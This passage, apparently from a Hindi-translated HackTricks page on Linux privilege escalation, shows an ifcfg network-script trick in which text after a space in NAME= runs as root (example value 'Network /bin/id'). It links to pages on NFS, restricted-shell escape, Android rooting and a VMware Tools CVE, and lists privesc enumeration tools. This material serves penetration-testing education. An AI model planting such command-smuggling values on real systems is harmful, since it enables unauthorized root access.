मेरे मामले में, इन network scripts में `NAME=` attribue ठीक से हैंडल नहीं किया जाता है। यदि name में **white/blank space** है तो सिस्टम white/blank space के बाद के भाग को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद सब कुछ root के रूप में execute होता है**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network और /bin/id_ के बीच रिक्त स्थान पर ध्यान दें_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. यह `start`, `stop`, `restart`, और कभी-कभी `reload` जैसी सेवाओं को नियंत्रित करने वाली स्क्रिप्ट्स शामिल करता है। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पाथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` Upstart से जुड़ा होता है, जो Ubuntu द्वारा पेश किया गया एक नया service management है और service management कार्यों के लिए configuration files का उपयोग करता है। Upstart में बदलाव के बावजूद, SysVinit स्क्रिप्ट compatibility layer के कारण अभी भी Upstart के साथ उपयोग में रहती हैं।

systemd एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator संशोधनों के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया आसान होती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को एक userspace manager को एक्सपोज़ करने के लिए एक syscall हुक करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) स्थानीय ऐप को manager का impersonate करने और पहले से-rooted डिवाइसों पर root प्राप्त करने में सक्षम बना सकती है। अधिक जानकारी और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery process command lines से एक binary path निकालकर उसे `-v` के साथ privileged context में execute कर सकता है। permissive patterns (उदा., \S का उपयोग) writable locations (उदा., /tmp/httpd) में attacker-staged listeners से मेल खा सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

अधिक जानने और अन्य discovery/monitoring stacks पर लागू एक सामान्यीकृत पैटर्न देखने के लिए यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulnerabilities को enumerate करने का टूल [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
